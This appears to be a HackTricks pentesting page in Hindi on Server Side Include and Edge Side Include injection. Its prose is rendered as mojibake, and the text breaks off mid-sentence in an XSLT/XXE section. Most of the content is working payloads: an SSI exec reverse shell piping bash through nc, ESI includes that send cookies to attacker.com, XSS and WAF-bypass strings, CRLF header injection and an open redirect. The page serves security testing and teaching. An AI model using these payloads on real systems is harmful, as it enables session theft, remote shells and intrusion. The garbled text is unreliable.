# рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рд╕рдореНрдорд┐рд▓рди / рдПрдЬ рд╕рд╛рдЗрдб рд╕рдореНрдорд┐рд▓рди рдЗрдВрдЬреЗрдХреНрд╢рди

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>

## рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рд╕рдореНрдорд┐рд▓рди рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

SSI (Server Side Includes) рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдВ рд╣реИрдВ рдЬреЛ **HTML рдкреЗрдЬ рдореЗрдВ рд░рдЦреА рдЬрд╛рддреА рд╣реИрдВ, рдФрд░ рд╕рд░реНрд╡рд░ рдкрд░ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ** рдЬрдм рдкреЗрдЬ рд╕реЗрд╡рд╛ рдХреА рдЬрд╛ рд░рд╣реА рд╣реЛрддреА рд╣реИрдВред рдЗрдиреНрд╣реЗрдВ рдЖрдк **рдореМрдЬреВрджрд╛ HTML рдкреЗрдЬ рдореЗрдВ рдирд╛рдорд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬреИрд╕реЗ:

`<!--#echo var="DATE_LOCAL" -->`

рдФрд░, рдЬрдм рдкреЗрдЬ рд╕реЗрд╡рд╛ рдХреА рдЬрд╛рддреА рд╣реИ, рдЗрд╕ рдЯреБрдХрдбрд╝реЗ рдХреЛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЗрд╕рдХреЗ рдореВрд▓реНрдп рд╕реЗ рдмрджрд▓ рдЬрд╛рдПрдЧрд╛:

`Tuesday, 15-Jan-2013 19:28:54 EST`

SSI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрдм рдХрд░рдирд╛ рд╣реИ рдФрд░ рдХрдм рдХрд┐рд╕реА рдХрд╛рд░реНрдпрдХреНрд░рдо рджреНрд╡рд╛рд░рд╛ рдкреВрд░рд╛ рдкреЗрдЬ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╣реИ, рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдкреЗрдЬ рдХрд┐рддрдирд╛ рд╕реНрдерд┐рд░ рд╣реИ рдФрд░ рдкреЗрдЬ рд╕реЗрд╡рд╛ рд╣реЛрдиреЗ рдкрд░ рд╣рд░ рдмрд╛рд░ рдХрд┐рддрдирд╛ рдкреБрдирд░реНрдЧрдгрди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдирд┐рд░реНрдгрдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред SSI рдПрдХ рдЫреЛрдЯреЗ рдЯреБрдХрдбрд╝реЛрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рдПрдХ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рд╡рд░реНрддрдорд╛рди рд╕рдордп - рдКрдкрд░ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдкрдХреЗ рдкреЗрдЬ рдХрд╛ рдЕрдзрд┐рдХрд╛рдВрд╢ рд╣рд┐рд╕реНрд╕рд╛ рд╕реЗрд╡рд╛ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕рдордп рдкрд░ рдЙрддреНрдкрдиреНрди рд╣реЛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдХрд┐рд╕реА рдЕрдиреНрдп рд╕рдорд╛рдзрд╛рди рдХреА рддрд▓рд╛рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред (рдкрд░рд┐рднрд╛рд╖рд╛ [рдпрд╣рд╛рдВ](https://httpd.apache.org/docs/current/howto/ssi.html) рд╕реЗ рд▓реА рдЧрдИ рд╣реИ)ред

рдЖрдк рдпрд╣ рдЬрд╛рди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ SSI рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рд╣реИ рдпрджрд┐ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди `.shtml`, `.shtm` рдпрд╛ `.stm` рдирд╛рдордХ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдХреЗрд╡рд▓ рдПрдХ рдорд╛рдорд▓рд╛ рдирд╣реАрдВ рд╣реИред

рдПрдХ рд╕рд╛рдзрд╛рд░рд┐рдд SSI рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдХрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рд╛рд░реВрдк рд╣реЛрддрд╛ рд╣реИ:
```
<!--#directive param="value" -->
```
### рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## рдПрдЬ рд╕рд╛рдЗрдб рдЗрдирдХреНрд▓реВрдЬрди

рдпрд╣рд╛рдВ рдПрдХ рд╕рдорд╕реНрдпрд╛ рд╣реИ **рдЬрд╛рдирдХрд╛рд░реА рдХреИрд╢рд┐рдВрдЧ рдпрд╛ рдЧрддрд┐рд╢реАрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛ рд╕рд╛рдордЧреНрд░реА рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЙрд╕рдХрд╛ **рдкрд░рд┐рд╡рд░реНрддрд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ** рдЬрдм рд╕рд╛рдордЧреНрд░реА рдЕрдЧрд▓реА рдмрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛рддреА рд╣реИред рдпрд╣реА рдХрд╛рд░рдг рд╣реИ рдХрд┐ **ESI** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, ESI рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЧрддрд┐рд╢реАрд▓ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛** рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреИрд╢ рд╕рдВрд╕реНрдХрд░рдг рднреЗрдЬрдиреЗ рд╕реЗ рдкрд╣рд▓реЗред\
рдпрджрд┐ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдХреИрд╢ рд╕рд╛рдордЧреНрд░реА рдореЗрдВ **ESI рдЯреИрдЧ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рднреЗрдЬрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкрд░ **рдЕрдирд┐рдпрдорд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

### ESI рдкрддрд╛ рд▓рдЧрд╛рдирд╛

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд **рд╣реЗрдбрд░** рд╕реЗ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ ESI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ:
```
Surrogate-Control: content="ESI/1.0"
```
рдпрджрд┐ рдЖрдк рдЗрд╕ рд╣реИрдбрд░ рдХреЛ рдирд╣реАрдВ рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рд╕рд░реНрд╡рд░ **рд╢рд╛рдпрдж ESI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реЛ** рд╕рдХрддрд╛ рд╣реИред\
рдПрдХ **рдЕрдВрдзрд╛ рд╢реЛрдзрди рджреГрд╖реНрдЯрд┐рдХреЛрдг рднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рдЕрдиреБрд░реЛрдз рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЗ рд╕рд░реНрд╡рд░ рдкрд░ рдкрд╣реБрдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI рд╢реЛрд╖рдг

[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) рдиреЗ рдПрдХ рддрд╛рд▓рд┐рдХрд╛ рдмрдирд╛рдИ рд╣реИ рдЬреЛ рд╣рдореЗрдВ рд╕рдордЭрдиреЗ рдореЗрдВ рдорджрдж рдХрд░реЗрдЧреА рдХрд┐ рд╣рдо рдХрд┐рд╕реА рднреА ESI-рд╕рдХреНрд╖рдо рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рди рд╕рдВрднрд╛рд╡рд┐рдд рд╣рдорд▓реЛрдВ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдХрд┐ рд╕рдорд░реНрдерд┐рдд рд╡рд┐рднрд┐рдиреНрди рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░реЗрдЧрд╛ред рдиреАрдЪреЗ рджреА рдЧрдИ рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рд╕реНрддрдВрдн рдирд╛рдореЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣рдо рдХреБрдЫ рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг рдкреНрд░рджрд╛рди рдХрд░реЗрдВрдЧреЗ:

* **Includes**: `<esi:includes>` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ
* **Vars**: `<esi:vars>` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред XSS рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдЙрдореНрдореАрджрд╡рд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ
* **Cookie**: рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреБрдХреАрдЬрд╝ ESI рдЗрдВрдЬрди рдХреЗ рд▓рд┐рдП рдкрд╣реБрдБрдЪрдиреЗ рдпреЛрдЧреНрдп рд╣реИрдВ
* **Upstream Headers Required**: рдпрджрд┐ рдЕрдкрд╕реНрдЯреНрд░реАрдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╣реЗрдбрд░ рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╕рд░реЛрдЧреЗрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди ESI рд╡рд┐рдзрд╛рдиреЛрдВ рдХреЛ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдирд╣реАрдВ рдХрд░реЗрдЧрд╛
* **Host Whitelist**: рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, ESI рд╕рдорд╛рд╡реЗрд╢ рдХреЗрд╡рд▓ рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рд╕рд░реНрд╡рд░ рд╣реЛрд╕реНрдЯ рд╕реЗ рд╕рдВрднрд╡ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ SSRF, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреЗрд╡рд▓ рдЙрди рд╣реЛрд╕реНрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕рдВрднрд╡ рд╣реИрдВ

|         **рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |     рд╣рд╛рдБ     |    рд╣рд╛рдБ   |     рд╣рд╛рдБ     |              рд╣рд╛рдБ              |         рдирд╣реАрдВ         |
|         Varnish Cache        |     рд╣рд╛рдБ     |    рдирд╣реАрдВ    |      рдирд╣реАрдВ     |              рд╣рд╛рдБ              |         рд╣рд╛рдБ        |
|            Fastly            |     рд╣рд╛рдБ     |    рдирд╣реАрдВ    |      рдирд╣реАрдВ     |               рдирд╣реАрдВ              |         рд╣рд╛рдБ        |
| Akamai ESI Test Server (ETS) |     рд╣рд╛рдБ     |    рд╣рд╛рдБ   |     рд╣рд╛рдБ     |               рдирд╣реАрдВ              |         рдирд╣реАрдВ         |
|          NodeJS esi          |     рд╣рд╛рдБ     |    рд╣рд╛рдБ   |     рд╣рд╛рдБ     |               рдирд╣реАрдВ              |         рдирд╣реАрдВ         |
|         NodeJS nodesi        |     рд╣рд╛рдБ     |    рдирд╣реАрдВ    |      рдирд╣реАрдВ     |               рдирд╣реАрдВ              |      рд╡реИрдХрд▓реНрдкрд┐рдХ      |

#### XSS

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд ESI рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдПрдХ рд╡рд┐рдЪрд┐рддреНрд░ рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХрд░реЗрдЧреАред
```markup
<esi:include src=http://attacker.com/xss.html>
```
рдлрд╝рд╛рдЗрд▓ _http://attacker.com/xss.html_ рдореЗрдВ `<script>alert(1)</script>` рдЬреИрд╕реЗ XSS рдкреЗрд▓реЛрдб рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

#### рдХреНрд▓рд╛рдЗрдВрдЯ XSS рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░реЗрдВ
```markup
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### рдХреБрдХреА рдЪреЛрд░реА рдХрд░реЗрдВ

* рджреВрд░рд╕реНрде рдХреБрдХреА рдЪреЛрд░реА
```markup
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* XSS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЙрд╕реЗ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░рдХреЗ HTTP\_ONLY рдХреБрдХреА рдЪреБрд░рд╛рдПрдВ:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->
```
<figure><img src="../.gitbook/assets/image (4) (7).png" alt=""><figcaption></figcaption></figure>

* рдкреВрд░реНрдг рдЦрд╛рддрд╛ рд╣рд╛рд╕рд┐рд▓ рдХрд░рдирд╛ рдХреБрдХреАрдЬрд╝ рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░рдХреЗ

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

#### рдирд┐рдЬреА рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓

рдЗрд╕реЗ "рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдореНрдорд┐рд▓рди" рд╕реЗ рдЧрд▓рддреА рд╕реЗ рди рдЧрд┐рдиреЗрдВ:
```markup
<esi:include src="secret.txt">
```
#### CRLF

CRLF (Carriage Return Line Feed) рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╡рд░реНрдгрдХреНрд░рдо рд╣реИ рдЬреЛ рдЯреЗрдХреНрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рдирдП рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдЕрд▓рдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред CRLF рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рд╡рд░реНрдгрдХреНрд░рдо рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдкрд╣рд▓реЗ рдХрд╛рд░реНрдпрдХреНрд╖реЗрддреНрд░ рд╡рд╛рдкрд╕ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдирдпрд╛ рдкрдВрдХреНрддрд┐ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИред рдпрд╣ рд╡рд░реНрдгрдХреНрд░рдо рд╡реЗрдм рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рднреА рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдпрд╣ рдЕрдиреБрд░реЛрдз рд╢реАрд░реНрд╖рдХ рдФрд░ рд╢рд░реАрд░ рдХреЗ рдмреАрдЪ рдПрдХ рд░рд┐рдХреНрдд рд╕реНрдерд╛рди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдПрдХ CRLF рдЕрджреНрдпрддрди рдХреЗ рджреНрд╡рд╛рд░рд╛, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рд╡реЗрдм рдЕрдиреБрд░реЛрдз рдореЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд рд╣реЗрдбрд░реНрд╕ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЕрдкрдиреА рдЗрдЪреНрдЫрд╛рдиреБрд╕рд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЕрдкреЗрдХреНрд╖рд┐рдд рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрддрд┐рд░рд┐рдХреНрдд рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдПрдХ CRLF рдЕрджреНрдпрддрди рдХреЗ рджреНрд╡рд╛рд░рд╛, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рд╡реЗрдм рдЕрдиреБрд░реЛрдз рдореЗрдВ рдЕрддрд┐рд░рд┐рдХреНрдд рд╣реЗрдбрд░реНрд╕ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЕрдкрдиреА рдЗрдЪреНрдЫрд╛рдиреБрд╕рд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЕрдкрдиреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЕрдкреЗрдХреНрд╖рд┐рдд рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрддрд┐рд░рд┐рдХреНрдд рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрддреНрддрд░ рдореЗрдВ `Location` рд╣реЗрдбрд░ рдЬреЛрдбрд╝ рджреЗрдЧрд╛ред
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### рд╣реЗрдбрд░ рдЬреЛрдбрд╝реЗрдВ

* рдмрд▓рд╡рд╛рди рдЕрдиреБрд░реЛрдз рдореЗрдВ рд╣реЗрдбрд░ рдЬреЛрдбрд╝реЗрдВ
```html
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* рдЙрддреНрддрд░ рдореЗрдВ рд╣реЗрдбрд░ рдЬреЛрдбрд╝реЗрдВ (рдПрдХ рдРрд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ "Content-Type: text/json" рдХреЛ рдЫрд▓рдиреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->
```
<figure><img src="../.gitbook/assets/image (5) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

#### CRLF рдореЗрдВ рд╣реЗрдбрд░ рдЬреЛрдбрд╝реЗрдВ (**CVE-2019-2438)**
```markup
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### рдЕрдХрд╛рдорд╛рдИ рдбреАрдмрдЧ

рдпрд╣ рдЬрд╡рд╛рдм рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдбреАрдмрдЧ рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬреЗрдЧрд╛:
```markup
<esi:debug/>
```
### ESI + XSLT = XXE

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ `xslt` рдорд╛рди рдХреЛ _dca_ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗ **\_**eXtensible Stylesheet Language Transformations (XSLT)**\_** \*\* рдЖрдзрд╛рд░рд┐рдд ESI рдЗрдирдХреНрд▓реВрдб рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЗрдирдХреНрд▓реВрдб HTTP рд╕рд░реЛрдЧреЗрдЯ рдХреЛ XML рдФрд░ XSLT рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдЧрд╛ред рдлрд┐рд░ XSLT рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ XML рдлрд╝рд╛рдЗрд▓ рдХреЛ 